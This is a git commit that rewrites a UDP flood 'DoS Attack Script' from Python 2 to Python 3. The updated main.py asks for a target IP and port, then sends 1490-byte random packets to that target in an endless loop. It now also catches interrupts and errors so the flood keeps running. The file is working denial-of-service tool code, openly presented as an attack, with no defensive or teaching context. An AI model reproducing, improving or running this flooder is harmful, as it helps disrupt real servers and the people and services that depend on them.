f6f39849c4e13dd951f368e6a9e30be181aaa7b5
Fimall <129761873+ItsFimall@users.noreply.github.com>
2023-09-01 22:40:20 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,60 +1,36 @@
 import sys
-import os
 import time
 import socket
 import random
-# Code Time
 from datetime import datetime
+
 now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year
 
 _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-# Initialize socket
 
-os.system("clear")
-os.system("figlet DoS Attack")
-print
-print "Original Author   : HA-MRX @ https://github.com/Ha3MrX"
-print "Remaker           : Fimall @ https://github.com/ItsFimall"
-print "Repo              : https://github.com/ItsFimall/DoS-Attack"
-print
-# Authors' info's display
+print("DoS Attack Script")
+print("Original Author   : HA-MRX @ https://github.com/Ha3MrX")
+print("Remaker           : Fimall @ https://github.com/ItsFimall")
+print("Repo              : https://github.com/ItsFimall/DoS-Attack")
 
-ip = raw_input("IP     : ")
-port = input("Port   : ")
+ip = input("IP     : ")
+port = int(input("Port   : "))
 
 if port < 1 or port > 65535:
-     print "Port range error"
-     exit()
+    print("Port range error")
+    sys.exit()
 
 sent = 0
-# User input DoS Target
-
-os.system("clear")
-
-# os.system("figlet Attack Starting")
-# print "[                    ] 0% "
-# time.sleep(5)
-# print "[=====               ] 25%"
-# time.sleep(5)
-# print "[==========          ] 50%"
-# time.sleep(5)
-# print "[===============     ] 75%"
-# time.sleep(5)
-# print "[====================] 100%"
-# time.sleep(3)
 
 while True:
-     bytes = random._urandom(1490) # Randomized Bytes
-     
-     _socket.sendto(bytes, (ip,port)) # Socket send packets
-     
-     sent = sent + 1
-     port = port + 1
-     
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-
+    try:
+        bytes = random._urandom(1490)  # Randomized Bytes
+        _socket.sendto(bytes, (ip, port))  # Socket send packets
+        sent = sent + 1
+        print(f"Sent {sent} packet to {ip} through port: {port}")
+    except KeyboardInterrupt:
+        print("User interrupted the attack.")
+        sys.exit()
+    except Exception as e:
+        print(f"An error occurred: {e}")
